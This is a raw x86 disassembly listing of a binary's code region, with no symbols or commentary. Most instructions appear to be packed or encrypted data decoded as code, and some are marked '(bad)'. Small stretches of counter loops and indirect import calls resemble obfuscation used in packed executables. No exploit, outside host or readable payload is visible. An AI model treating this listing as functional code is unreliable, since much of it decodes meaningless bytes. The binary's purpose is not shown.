  409c6a:	scas   eax,DWORD PTR es:[edi]
  409c6b:	sub    ebx,DWORD PTR [edi+0x3e192103]
  409c71:	bound  eax,QWORD PTR [ecx+0x7e]
  409c74:	cwde   
  409c75:	test   eax,0xcdf0713a
  409c7a:	mov    ecx,0x65d0851f
  409c7f:	push   es
  409c80:	push   ds
  409c81:	iret   
  409c82:	outs   dx,DWORD PTR ds:[esi]
  409c83:	in     al,dx
  409c84:	mov    WORD PTR [eax],cs
  409c86:	aad    0x4b
  409c88:	aam    0x98
  409c8a:	test   BYTE PTR [esp+ecx*8+0x1a702321],cl
  409c91:	mov    al,ds:0x2bb296f2
  409c96:	cmp    al,0x5c
  409c98:	int    0x44
  409c9a:	daa    
  409c9b:	fwait
  409c9c:	pop    edx
  409c9d:	mov    ebx,0xd252ad7d
  409ca2:	mov    al,ds:0xc60a174e
  409ca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ca8:	or     ch,BYTE PTR [si]
  409cab:	and    ah,BYTE PTR [edx-0x6bfb170d]
  409cb1:	mov    ds:0x54bba28,eax
  409cb6:	aas    
  409cb7:	mov    bl,0x3c
  409cb9:	sbb    eax,0x38678304
  409cbe:	scas   eax,DWORD PTR es:[edi]
  409cbf:	es retf 
  409cc1:	mov    ebx,0xb114014c
  409cc6:	push   eax
  409cc7:	mov    BYTE PTR ds:0x5644ff12,cl
  409ccd:	sahf   
  409cce:	ja     0x409cf7
  409cd0:	xchg   BYTE PTR [ebx-0x289383c],dl
  409cd6:	imul   ebp,DWORD PTR [ecx+0x8],0xffffffec
  409cda:	xor    ebp,eax
  409cdc:	and    eax,0x7c618be6
  409ce1:	je     0x409d37
  409ce3:	and    al,0x7b
  409ce5:	mov    edi,0x92790b67
  409cea:	in     al,dx
  409ceb:	pop    edx
  409cec:	jno    0x409c7e
  409cee:	fisub  WORD PTR [edx+0x4f6b1229]
  409cf4:	and    eax,0x38d09418
  409cf9:	dec    edi
  409cfa:	popf   
  409cfb:	adc    ecx,DWORD PTR [esi]
  409cfd:	adc    DWORD PTR [ebx-0x7acba754],edi
  409d03:	clc    
  409d04:	jo     0x409cbf
  409d06:	aas    
  409d07:	loope  0x409cff
  409d09:	sub    al,0xa0
  409d0b:	ficom  DWORD PTR gs:[edx+0x5bb0a99d]
  409d12:	xor    ah,cl
  409d14:	jg     0x409d39
  409d16:	adc    ebp,DWORD PTR [eax+0x3f33d73d]
  409d1c:	dec    esp
  409d1d:	outs   dx,BYTE PTR ds:[esi]
  409d1e:	mov    al,0xdb
  409d20:	mov    eax,ds:0x9310f698
  409d25:	(bad)  
  409d26:	outs   dx,BYTE PTR ds:[esi]
  409d27:	pushf  
  409d28:	aad    0x7
  409d2a:	leave  
  409d2b:	(bad)
  409d2e:	call   0x38597eb5
  409d33:	cdq    
  409d34:	jle    0x409ce6
  409d36:	sbb    BYTE PTR [edi-0x17],0xc1
  409d3a:	cmp    BYTE PTR [edi-0x10e7e346],al
  409d40:	ins    DWORD PTR es:[edi],dx
  409d41:	es (bad) 
  409d43:	aaa    
  409d44:	and    esp,esi
  409d46:	inc    ebx
  409d47:	sbb    bh,dl
  409d49:	fucomip st,st(1)
  409d4b:	push   edx
  409d4c:	dec    ebp
  409d4d:	pop    esp
  409d4e:	hlt    
  409d4f:	adc    al,0xdb
  409d51:	outs   dx,DWORD PTR ds:[esi]
  409d52:	xchg   ecx,eax
  409d53:	lea    edx,[ecx]
  409d55:	pshufw mm2,QWORD PTR [edi],0xa9
  409d59:	pop    ss
  409d5a:	xor    al,0xcb
  409d5c:	std    
  409d5d:	ins    BYTE PTR es:[edi],dx
  409d5e:	std    
  409d5f:	push   cs
  409d60:	push   cs
  409d61:	pop    ds
  409d62:	xor    ecx,DWORD PTR [esi-0x77]
  409d65:	push   edi
  409d66:	imul   eax,DWORD PTR [ebp+0x4cc7f59e],0x2e10cdf0
  409d70:	pop    ds
  409d71:	mov    edi,0xc1a128da
  409d76:	add    DWORD PTR [ecx+0x2b16e4c5],0xffffff96
  409d7d:	adc    DWORD PTR cs:[edi+0x61],ebp
  409d81:	test   ecx,ecx
  409d83:	mov    DWORD PTR ds:0x433717,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43370b
  409d9c:	sub    DWORD PTR ds:0x4337df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433753,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	or     al,0x79
  409dc0:	repnz mov eax,0x7e7ee238
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	mov    esi,0x74542023
  409dcf:	mov    edx,0xdc06889c
  409dd4:	lahf   
  409dd5:	retf   0x4a5f
  409dd8:	je     0x409da9
  409dda:	fist   WORD PTR [edx-0x74]
  409ddd:	dec    ebp
  409dde:	mov    al,0x33
  409de0:	mov    ebp,0xe581049
  409de5:	jle    0x409e56
  409de7:	pusha  
  409de8:	adc    BYTE PTR [ecx+0x2db699df],ch
  409dee:	loop   0x409d75
  409df0:	mov    esi,0xff736463
  409df5:	mov    eax,0xc22a0f29
  409dfa:	xchg   esp,eax
  409dfb:	dec    esi
  409dfc:	push   eax
  409dfd:	in     eax,0xc5
  409dff:	into   
  409e00:	test   DWORD PTR [esi+ebp*8],ecx
  409e03:	sbb    al,0xbc
  409e05:	or     eax,0xe09dfc42
  409e0a:	xor    ah,dh
  409e0c:	sub    DWORD PTR [esp+eax*8],ebp
  409e0f:	test   al,0x48
  409e11:	stos   BYTE PTR es:[edi],al
  409e12:	pop    esi
  409e13:	dec    ebp
  409e14:	rcr    cl,0x60
  409e17:	jmp    FWORD PTR [edx]
  409e19:	push   edx
  409e1a:	lds    esi,FWORD PTR [esi]
  409e1c:	cmc    
  409e1d:	xor    ch,BYTE PTR [ebp-0x6f56a71e]
  409e23:	lds    esi,FWORD PTR [eax]
  409e25:	inc    ebx
  409e26:	adc    al,0xd9
  409e28:	call   0x6067df5a
  409e2d:	mov    bh,0x53
  409e2f:	mov    ah,0x7d
  409e31:	(bad)  
  409e32:	xchg   ebx,eax
  409e33:	iret   
  409e34:	mov    ebp,0x4d7067f
  409e39:	repz inc esp
  409e3b:	pop    es
  409e3c:	fmul   st,st(0)
  409e3e:	and    BYTE PTR [edx+ebp*4+0x552e9db6],0xcb
  409e46:	je     0x409e75
  409e48:	out    0x24,eax
  409e4a:	push   0x4
  409e4c:	ja     0x409e39
  409e4e:	add    cl,BYTE PTR [edx+0x65]
  409e51:	push   cs
  409e52:	aam    0xc7
  409e54:	repz leave 
  409e56:	in     al,0x82
  409e58:	mov    ebp,0x1ff24ae
  409e5d:	or     bl,BYTE PTR [esi-0x14]
  409e60:	inc    esi
  409e61:	aad    0x8b
  409e63:	dec    ecx
  409e64:	mov    dh,0x53
  409e66:	xchg   edx,eax
  409e67:	sahf   
  409e68:	jp     0x409dfa
  409e6a:	and    bh,BYTE PTR ds:0xd506d3d4
  409e70:	fcomp  QWORD PTR [ebp+0x3341fa29]
  409e76:	mov    ds:0x27455d1d,eax
  409e7b:	mov    dh,0xe
  409e7d:	mov    dl,0x1d
  409e7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e80:	ja     0x409ead
  409e82:	(bad)
  409e86:	xchg   esi,eax
  409e87:	pop    ss
  409e88:	jg     0x409e2c
  409e8a:	adc    eax,0x6a5e2c14
  409e8f:	loope  0x409efb
  409e91:	dec    eax
  409e92:	mov    ebx,0x84286e93
  409e97:	out    dx,al
  409e98:	push   0xffffffca
  409e9a:	in     eax,dx
  409e9b:	mov    ds:0x6ff3e2d7,al
  409ea0:	cmp    DWORD PTR [edx],ebx
  409ea2:	les    esp,FWORD PTR [edi+0x6fc3b9ab]
  409ea8:	mov    ebp,0x72950e8d
  409ead:	out    0x43,eax
  409eaf:	or     al,0x26
  409eb1:	movaps xmm1,XMMWORD PTR [ebp+0x57819368]
  409eb8:	loop   0x409e81
  409eba:	sub    BYTE PTR [esp+edi*4+0x34],al
  409ebe:	jp     0x409e49
  409ec0:	xchg   ebp,eax
  409ec1:	xor    al,0x1b
  409ec3:	or     edi,DWORD PTR [ebx+ebp*1+0x1a0a2f27]
  409eca:	adc    al,0x6e
  409ecc:	mov    al,0x6a
  409ece:	rcr    BYTE PTR [edx],0xc3
  409ed1:	inc    edi
  409ed2:	jmp    0x409f1e
  409ed4:	pop    eax
  409ed5:	mov    al,ds:0x4a9ff566
  409eda:	and    ebp,DWORD PTR [esi+0x4e8f6b71]
  409ee0:	ret    
  409ee1:	inc    esp
  409ee2:	sbb    cl,0xc4
  409ee5:	jno    0x409e97
  409ee7:	mov    ds:0x1d905d43,eax
  409eec:	imul   ebp,DWORD PTR [edx-0x3bf7d83f],0x5e
  409ef3:	lahf   
  409ef4:	loope  0x409eaf
  409ef6:	mov    dh,0x99
  409ef8:	lea    esi,[ebx]
  409efa:	imul   esi,ebp,0xd37bb0c3
  409f00:	test   BYTE PTR ds:0x56396931,ch
  409f06:	pop    ss
  409f07:	dec    BYTE PTR [ecx]
  409f09:	mov    eax,0xa9acc47f
  409f0e:	int    0x9b
  409f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f11:	nop
  409f12:	push   esp
  409f13:	pop    ebx
  409f14:	add    DWORD PTR [ebx+0x7b],esi
  409f17:	dec    ecx
  409f18:	push   0xffffff85
  409f1a:	dec    edi
  409f1b:	mov    al,ds:0xfcf11f66
  409f20:	jl     0x409f16
  409f22:	mov    bh,0x1c
  409f24:	and    al,0xcf
  409f26:	push   ebp
  409f27:	push   ebp
  409f28:	dec    esp
  409f29:	or     esp,DWORD PTR [ecx+0x210d1e9d]
  409f2f:	adc    ecx,DWORD PTR [ebx+esi*4+0x46400fa0]
  409f36:	dec    ecx
  409f37:	mov    BYTE PTR [ebx-0x349a26f5],cl
  409f3d:	cmp    al,0x48
  409f3f:	dec    edx
  409f40:	sub    eax,0x78b54a97
  409f45:	push   edx
  409f46:	add    bh,BYTE PTR [ecx+0x3185bc38]
  409f4c:	ins    DWORD PTR es:[edi],dx
  409f4d:	aas    
  409f4e:	inc    eax
  409f4f:	jnp    0x409ee0
  409f51:	rol    ebp,0x82
  409f54:	pop    ecx
  409f55:	mov    ah,0x8a
  409f57:	jg     0x409f05
  409f59:	inc    ecx
  409f5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f5b:	and    eax,0xebeb4832
  409f60:	dec    ecx
  409f61:	mov    ch,0x5e
  409f63:	shl    BYTE PTR [ebx+0x4090104e],1
  409f69:	ss and edx,edx
  409f6c:	sub    al,0xfc
  409f6e:	adc    eax,edi
  409f70:	mov    ecx,DWORD PTR [edi+0x32]
  409f73:	inc    esi
  409f74:	inc    ecx
  409f75:	icebp  
  409f76:	repnz mov ecx,0x8c0bf3e7
  409f7c:	imul   edx,DWORD PTR [edi+0x71],0x3dc33ad6
  409f83:	addr16 ret 0xe298
  409f87:	inc    esp
  409f88:	jnp    0x409f38
  409f8a:	jle    0x409fad
  409f8c:	loop   0x409f6b
  409f8e:	ror    BYTE PTR [ebp+0x4c],cl
  409f91:	or     BYTE PTR [edx+0x7114f7ce],bl
  409f97:	inc    esi
  409f98:	xchg   esi,eax
  409f99:	pop    ds
  409f9a:	hlt    
  409f9b:	jmp    0xd4db52b6
  409fa0:	ja     0x409f71
  409fa2:	mov    WORD PTR [esi+0x7a65556],fs
  409fa8:	jecxz  0x409fab
  409faa:	jb     0x409f47
  409fac:	sbb    esi,ebp
  409fae:	add    al,0x4b
  409fb0:	jo     0x40a029
  409fb2:	add    al,0x2f
  409fb4:	in     al,dx
  409fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fb6:	bound  ebp,QWORD PTR [ecx]
  409fb8:	fstp   QWORD PTR [ebp-0x3c]
  409fbb:	mov    BYTE PTR [ecx-0x7f],cl
  409fbe:	lea    esi,[eax-0x14]
  409fc1:	retf   
  409fc2:	daa    
  409fc3:	or     edi,DWORD PTR [edi-0x68d1330c]
  409fc9:	mov    BYTE PTR [ebx-0x506d5eed],bl
  409fcf:	adc    DWORD PTR [edi-0x7c],eax
  409fd2:	repnz mov ds:0x5800ac75,eax
  409fd8:	imul   esp,esp,0x1e705bd5
  409fde:	jmp    0x409f90
  409fe0:	mov    ds,ecx
  409fe2:	mov    ah,0x5f
  409fe4:	std    
  409fe5:	mov    cs,ebx
  409fe7:	mov    ch,BYTE PTR [ecx-0x5d]
  409fea:	(bad)  
  409fec:	dec    edx
  409fed:	push   cs
  409fee:	mov    al,0x4a
  409ff0:	add    BYTE PTR [edi+0x66],0x28
  409ff4:	mov    BYTE PTR [ebx-0x7a],al
  409ff7:	pop    ebp
  409ff8:	fldcw  WORD PTR [edi]
  409ffa:	adc    eax,0x83029181
  409fff:	push   ds
  40a000:	cmp    al,0xe3
  40a002:	lahf   
  40a003:	xchg   esp,eax
  40a004:	int    0x15
  40a006:	jmp    0x6553936b
  40a00b:	shl    DWORD PTR [ebp+0x5a],1
  40a00e:	not    DWORD PTR [ebp+0xf]
  40a011:	scas   eax,DWORD PTR es:[edi]
  40a012:	sar    BYTE PTR [ecx+0x4573],1
  40a018:	mov    edi,DWORD PTR ds:0x4337d3
  40a01e:	sbb    DWORD PTR ds:0x43370f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433763,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433723
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43375b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43375b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43375b,ecx
  40a059:	cmp    DWORD PTR ds:0x43375b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43393e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43375b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43370b,0x11
  40a090:	cmp    DWORD PTR ds:0x43370b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43370b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43370b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43370b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43370b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43370b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43370b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433703,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43376f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433713
  40a0ff:	mov    DWORD PTR ds:0x43376f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433767,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	cld    
  40a127:	lods   eax,DWORD PTR ds:[esi]
  40a128:	cdq    
  40a129:	mov    dh,0x82
  40a12b:	loopne 0x40a1ab
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a1b0
  40a133:	ja     0x40a0c4
  40a135:	test   BYTE PTR cs:[ecx+0x5330b9b6],dl
  40a13c:	pop    eax
  40a13d:	retf   0x4280
  40a140:	mov    al,ds:0x4bd77a25
  40a145:	pop    ebp
  40a146:	mov    BYTE PTR [ebx],bl
  40a148:	cmp    BYTE PTR [edx+eiz*8+0x6eeb1f77],ah
  40a14f:	cwde   
  40a150:	aas    
  40a151:	mov    ebp,0x21d062bc
  40a156:	inc    edx
  40a157:	in     eax,dx
  40a158:	pop    edi
  40a159:	ffreep st(0)
  40a15b:	es jmp 0xfe8b:0x88f17e71
  40a163:	loopne 0x40a124
  40a165:	push   ebx
  40a166:	xchg   esi,eax
  40a167:	sahf   
  40a168:	pop    es
  40a169:	js     0x40a12e
  40a16b:	ficom  DWORD PTR ds:0x3cb8ea7b
  40a171:	rcl    DWORD PTR [ebx-0x17],1
  40a174:	jno    0x40a175
  40a176:	fdiv   st(7),st
  40a178:	jecxz  0x40a192
  40a17a:	out    dx,al
  40a17b:	pop    eax
  40a17c:	jae    0x40a143
  40a17e:	loopne 0x40a197
  40a180:	stc    
  40a181:	es dec edi
  40a183:	inc    esp
  40a184:	ins    DWORD PTR es:[edi],dx
  40a185:	in     eax,0xca
  40a187:	mov    ecx,esi
  40a189:	mov    ds:0x8ca84550,eax
  40a18e:	ins    DWORD PTR es:[di],dx
  40a190:	inc    ebx
  40a191:	jno    0x40a1c1
  40a193:	bound  edx,QWORD PTR [esi]
  40a195:	push   0x62
  40a197:	sbb    BYTE PTR ds:0x814f2913,dh
  40a19d:	in     eax,0x75
  40a19f:	inc    edi
  40a1a0:	mov    ebx,ss
  40a1a2:	mov    ds:0xecab61d2,eax
  40a1a7:	stos   DWORD PTR es:[edi],eax
  40a1a8:	(bad)  
  40a1a9:	enter  0x1166,0x4f
  40a1ad:	scas   al,BYTE PTR es:[edi]
  40a1ae:	out    0x5b,al
  40a1b0:	imul   edx,esi,0x8eec99c1
  40a1b6:	mov    bl,0x18
  40a1b8:	sbb    al,0xe0
  40a1ba:	jmp    0x5675:0x7a796fd7
  40a1c1:	push   esi
  40a1c2:	push   edx
  40a1c3:	cli    
  40a1c4:	xchg   DWORD PTR es:[ecx+0x32de3ebf],ebp
  40a1cb:	push   esi
  40a1cc:	xlat   BYTE PTR ds:[ebx]
  40a1cd:	and    al,0xc4
  40a1cf:	jmp    0xb40e:0xd4620fc
  40a1d6:	aad    0x26
  40a1d8:	neg    BYTE PTR [ecx+esi*4+0x5c]
  40a1dc:	in     eax,0x8a
  40a1de:	retf   0xb0b
  40a1e1:	(bad)  
  40a1e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1e4:	jg     0x40a1b5
  40a1e6:	cwde   
  40a1e7:	sbb    edi,DWORD PTR [edi-0x21d69ec9]
  40a1ed:	repz mov eax,0x7192ab9d
  40a1f3:	jg     0x40a20b
  40a1f5:	push   edx
  40a1f6:	mov    ah,BYTE PTR [ebp+0xae10abc]
  40a1fc:	arpl   WORD PTR [esi],sp
  40a1fe:	xor    DWORD PTR [edi-0x1085cd0c],esi
  40a204:	nop
  40a205:	icebp  
  40a206:	jb     0x40a232
  40a208:	aad    0xf8
  40a20a:	retf   0xe833
  40a20d:	adc    ebp,ebx
  40a20f:	sahf   
  40a210:	js     0x40a215
  40a212:	push   esp
  40a213:	pusha  
  40a214:	mov    ah,0x7e
  40a216:	out    0x5b,al
  40a218:	push   ds
  40a219:	mov    ch,0xf1
  40a21b:	cli    
  40a21c:	js     0x40a1b3
  40a21e:	addr16 retf 0xda23
  40a222:	arpl   WORD PTR [eax],di
  40a224:	rol    DWORD PTR [edx],1
  40a226:	nop
  40a227:	out    dx,eax
  40a228:	or     eax,0x20312f62
  40a22d:	xchg   DWORD PTR [eax+0x11],ebx
  40a230:	out    0xca,al
  40a232:	or     BYTE PTR [eax-0x3a5fb20e],ah
  40a238:	loope  0x40a1ba
  40a23a:	inc    eax
  40a23b:	adc    BYTE PTR [esi+edi*8],dh
  40a23e:	shl    DWORD PTR [edi],1
  40a240:	sti    
  40a241:	fisttp DWORD PTR [eax]
  40a243:	ss xchg ecx,eax
  40a245:	loopne 0x40a26f
  40a247:	pushf  
  40a248:	pop    ds
  40a249:	sbb    DWORD PTR [ecx],0x64f7b10
  40a24f:	mov    dl,dl
  40a251:	pop    ebx
  40a252:	sbb    al,0x40
  40a254:	mov    esp,gs
  40a256:	cmp    BYTE PTR [esi+0x48],cl
  40a259:	sbb    edi,DWORD PTR [eax]
  40a25b:	cmp    eax,0x80d10e97
  40a260:	push   cs
  40a261:	leave  
  40a262:	add    BYTE PTR [edi+esi*1+0x4c],bh
  40a266:	fild   DWORD PTR [eax-0x1]
  40a269:	xchg   ebx,eax
  40a26a:	sub    eax,0x80bde7a9
  40a26f:	pop    esi
  40a270:	dec    edx
  40a271:	gs addr16 dec esi
  40a274:	push   cs
  40a275:	cmp    DWORD PTR ss:[ebp+0x209ea25],edi
  40a27c:	test   DWORD PTR [ebx],ebx
  40a27e:	dec    ecx
  40a27f:	ret    
  40a280:	push   esp
  40a281:	add    al,0x13
  40a283:	jp     0x40a27c
  40a285:	sub    esi,DWORD PTR [ebx-0xfc2a3de]
  40a28b:	bound  ebx,QWORD PTR [ebx-0x51]
  40a28e:	or     eax,0xd2c50337
  40a293:	ficomp DWORD PTR [edi+eiz*1-0x16]
  40a297:	ffreep st(4)
  40a299:	xchg   edx,eax
  40a29a:	imul   esi,DWORD PTR [ebp-0x65],0xdadc2c6a
  40a2a1:	div    ch
  40a2a3:	push   eax
  40a2a4:	sbb    eax,0x62cb08b6
  40a2a9:	xor    ch,BYTE PTR [ebx+0x4d]
  40a2ac:	xchg   edx,eax
  40a2ad:	cmp    DWORD PTR [ebp-0x1d],ebp
  40a2b0:	outs   dx,DWORD PTR ds:[esi]
  40a2b1:	mov    cl,0xac
  40a2b3:	int    0xcb
  40a2b5:	push   eax
  40a2b6:	shr    DWORD PTR [ecx+0x74355e2b],cl
  40a2bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2bd:	pop    ecx
  40a2be:	pop    eax
  40a2bf:	shl    DWORD PTR [edi],cl
  40a2c1:	aad    0x5e
  40a2c3:	add    al,0xc2
  40a2c5:	xchg   ebp,eax
  40a2c6:	cmp    DWORD PTR [ecx-0x18],ebx
  40a2c9:	nop
  40a2ca:	inc    esi
  40a2cb:	pop    ds
  40a2cc:	iret   
  40a2cd:	cmp    bh,ch
  40a2cf:	cmc    
  40a2d0:	jbe    0x40a2aa
  40a2d2:	mov    WORD PTR ds:0x9a31e621,gs
  40a2d8:	adc    al,0xfa
  40a2da:	js     0x40a301
  40a2dc:	jbe    0x40a2f4
  40a2de:	out    0x26,eax
  40a2e0:	jno    0x40a263
  40a2e2:	sbb    eax,0x65605bcb
  40a2e7:	ins    BYTE PTR es:[edi],dx
  40a2e8:	xchg   ebx,eax
  40a2e9:	div    DWORD PTR [esi+0x9]
  40a2ec:	pop    ebp
  40a2ed:	fisttp WORD PTR [edi]
  40a2ef:	add    al,bl
  40a2f1:	push   0x93a7c1a1
  40a2f6:	add    DWORD PTR [edx-0x4a],ebp
  40a2f9:	imul   edi,DWORD PTR [ebp-0x51],0xf
  40a2fd:	cli    
  40a2fe:	out    0xfb,al
  40a300:	push   0xffffffdf
  40a302:	xor    BYTE PTR [edx+eiz*8-0x2f],dl
  40a306:	dec    edi
  40a307:	imul   ebx,DWORD PTR ds:0x9ff96085,0x43
  40a30e:	xchg   edx,eax
  40a30f:	cmp    al,0x64
  40a311:	or     DWORD PTR [ebp-0x5a],0x8ae44486
  40a318:	(bad)  
  40a319:	push   ebp
  40a31a:	pusha  
  40a31b:	test   BYTE PTR [ebp-0x30],cl
  40a31e:	mov    esi,0x20ace2bc
  40a323:	repnz dec edi
  40a325:	cld    
  40a326:	sbb    BYTE PTR [ecx],ch
  40a328:	add    bh,0xf7
  40a32b:	xchg   esp,eax
  40a32c:	adc    bl,BYTE PTR [eax+0x5b116be8]
  40a332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a333:	fcom   QWORD PTR [ecx]
  40a335:	and    bh,BYTE PTR [edx-0x33]
  40a338:	out    dx,eax
  40a339:	jmp    0x9e229fb0
  40a33e:	iret   
  40a33f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a340:	cmp    al,0xda
  40a342:	iret   
  40a343:	call   0xe6532c66
  40a348:	into   
  40a349:	out    dx,al
  40a34a:	in     eax,0x6c
  40a34c:	fcomp  QWORD PTR [edx+eax*8+0x11]
  40a350:	mov    esi,DWORD PTR [edi-0x1fd3ca59]
  40a356:	xrelease mov DWORD PTR [edx+0x3c],edx
  40a35a:	jno    0x40a39d
  40a35c:	inc    edi
  40a35d:	dec    ebp
  40a35e:	out    0x31,al
  40a360:	arpl   WORD PTR [ecx+0x46],ax
  40a363:	imul   ebx,DWORD PTR [esi],0xffffff90
  40a366:	repnz fwait
  40a368:	xchg   esp,eax
  40a369:	and    ch,BYTE PTR [eax-0x1cba1613]
  40a36f:	adc    cl,BYTE PTR [ebp+ebp*1+0x7]
  40a373:	xchg   esi,eax
  40a374:	dec    ecx
  40a375:	pushf  
  40a376:	sahf   
  40a377:	jmp    0x3428f107
  40a37c:	enter  0x2581,0xfb
  40a380:	ss inc ebx
  40a382:	add    BYTE PTR [eax],al
  40a384:	add    BYTE PTR [eax],al
  40a386:	add    cl,ch
  40a388:	push   cs
  40a389:	add    BYTE PTR [eax],al
  40a38b:	add    BYTE PTR [ebx],dh
  40a38d:	shl    BYTE PTR [ebx],0x5
  40a390:	sti    
  40a391:	ss inc ebx
  40a393:	add    BYTE PTR [eax-0x5d],al
  40a396:	sti    
  40a397:	ss inc ebx
  40a399:	add    BYTE PTR [ebx+0x4336fb3d],al
  40a39f:	add    BYTE PTR [esi],dl
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4336fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4337ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43376b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433767,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433767,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433767,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433797
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433767,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433767
  40a434:	dec    eax
  40a435:	mov    ds:0x433767,eax
  40a43a:	mov    eax,ds:0x433767
  40a43f:	dec    eax
  40a440:	mov    ds:0x433767,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43371f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43382f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433823,0x4337a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433707,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	and    BYTE PTR [esi+0x25],dl
  40a49e:	in     eax,dx
  40a49f:	dec    esp
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	jg     0x40a4a7
  40a4a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4aa:	push   ebp
  40a4ab:	ror    BYTE PTR [ecx-0x1d],1
  40a4ae:	pop    eax
  40a4af:	fs enter 0x529e,0x30
  40a4b4:	or     ch,BYTE PTR [ecx+ebp*1-0x49]
  40a4b8:	sub    dl,BYTE PTR [edi-0x57f3b40b]
  40a4be:	enter  0xbd95,0x7e
  40a4c2:	or     al,0x0
  40a4c4:	push   esp
  40a4c5:	enter  0x7d24,0x5
  40a4c9:	pop    ds
  40a4ca:	shr    DWORD PTR [eax-0x75],cl
  40a4cd:	fisub  DWORD PTR [eax-0x21e79d69]
  40a4d3:	shr    DWORD PTR [edi+0x7b],1
  40a4d6:	add    DWORD PTR [edi],esi
  40a4d8:	add    BYTE PTR [ebp-0x5746d4f],0x31
  40a4df:	outs   dx,DWORD PTR ds:[esi]
  40a4e0:	mov    bh,0xa4
  40a4e2:	dec    edi
  40a4e3:	mov    esi,0x32bcd910
